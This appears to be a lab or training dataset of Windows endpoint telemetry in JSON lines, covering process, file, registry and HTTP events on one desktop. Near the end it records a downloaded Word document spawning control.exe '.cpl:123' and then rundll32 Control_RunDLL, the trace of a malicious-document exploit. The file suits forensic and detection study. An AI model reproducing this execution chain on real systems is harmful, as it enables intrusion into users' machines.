{"timestamp":"2021-09-15T16:37:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:20","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:20","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:21","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:21","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:21","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:21","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Windows Update Agent","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:30","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:30","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Windows Update Agent","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:36","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:36","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:36","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:36","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:36","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:36","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:36","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\wuauclt.exe\" /UpdateDeploymentProvider wuaueng.dll /RunHandlerComServer","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:36","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\wuauclt.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:41","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:41","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Windows Update Agent","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:45","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:45","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:45","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:45","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:45","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:45","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:45","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:45","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:45","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:45","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\system32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:37:45","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:37:45","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:06","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:06","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:11","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:11","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:11","winlog.event_data.CommandLine":"C:\\Windows\\system32\\wevtutil.exe uninstall-manifest C:\\Windows\\TEMP\\D458512A-AB2B-E133-EA3C-3BE6C269E8C9.man","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2108.7-0\\MsMpEng.exe\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:11","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\wevtutil.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:11","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:11","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:11","winlog.event_data.CommandLine":"C:\\Windows\\system32\\wevtutil.exe install-manifest C:\\Windows\\TEMP\\D458512A-AB2B-E133-EA3C-3BE6C269E8C9.man \"/resourceFilePath:C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\StableEngineEtwLocation\\mpengine_etw.dll\" \"/messageFilePath:C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\StableEngineEtwLocation\\mpengine_etw.dll\" \"/parameterFilePath:C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\StableEngineEtwLocation\\mpengine_etw.dll\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2108.7-0\\MsMpEng.exe\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:11","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\wevtutil.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:12","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:12","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files\\WindowsApps\\Microsoft.YourPhone_1.21072.161.0_x64__8wekyb3d8bbwe\\YourPhone.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:14","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:14","src_ip":"192.168.0.191","http.url":"/c/msdownload/update/software/defu/2021/09/am_delta_patch_1.349.682.0_ec7de8b71f5ea1b91bf36486776f9a693a2e5d05.exe","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:15","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:15","src_ip":"192.168.0.191","http.url":"/c/msdownload/update/software/defu/2021/09/am_delta_patch_1.349.682.0_ec7de8b71f5ea1b91bf36486776f9a693a2e5d05.exe","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:17","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:17","src_ip":"192.168.0.191","http.url":"/c/msdownload/update/software/defu/2021/09/am_delta_patch_1.349.682.0_ec7de8b71f5ea1b91bf36486776f9a693a2e5d05.exe","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:17","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:17","src_ip":"192.168.0.191","http.url":"/filestreamingservice/files/4b88ad87-4200-403f-94ba-65a52397d537?P1=1631725459&P2=404&P3=2&P4=ZE99EOm%2bXjaNnwsaJTzcLadWHPH3tdztDjw7zG6bGdyaEue3ZuUw4O0BJGHJlqHbYLC68CcOx40B1ACAioV85w%3d%3d","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:17","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:17","src_ip":"192.168.0.191","http.url":"/filestreamingservice/files/4b88ad87-4200-403f-94ba-65a52397d537?P1=1631725459&P2=404&P3=2&P4=ZE99EOm%2bXjaNnwsaJTzcLadWHPH3tdztDjw7zG6bGdyaEue3ZuUw4O0BJGHJlqHbYLC68CcOx40B1ACAioV85w%3d%3d","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:24","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:24","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:24","winlog.event_data.CommandLine":"C:\\Windows\\system32\\svchost.exe -k LocalService -p -s WebClient","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\services.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:24","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\svchost.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":"S-1-5-21-1901252624-1317086816-3136730465-1001\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Documents\\TrustRecords\\%USERPROFILE%/Downloads/HalloweenPlans.docx","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"S-1-5-21-1901252624-1317086816-3136730465-1001\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Documents\\TrustRecords","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:33","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:33","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry value set (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:34","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:34","src_ip":"192.168.0.191","http.url":"/MFEwTzBNMEswSTAJBgUrDgMCGgUABBTBL0V27RVZ7LBduom%2FnYB45SPUEwQU5Z1ZMIJHWMys%2BghUNoZ7OrUETfACEA%2BnRyLFPYjID1ie%2Bx%2BdSjo%3D","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
